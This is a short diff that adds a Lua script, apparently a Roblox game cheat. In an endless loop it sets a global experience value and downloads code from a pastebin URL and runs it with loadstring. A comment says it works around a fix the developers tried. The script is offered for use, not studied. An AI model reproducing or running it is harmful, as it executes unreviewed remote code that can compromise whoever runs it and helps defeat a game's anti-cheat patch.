@@ -1,0 +1,4 @@
+while wait() do
+_G.Exp = 50 -- they attempted to fix it but this works now
+loadstring(game:HttpGet("https://pastebin.com/raw/JNdXExzJ"))()
+end
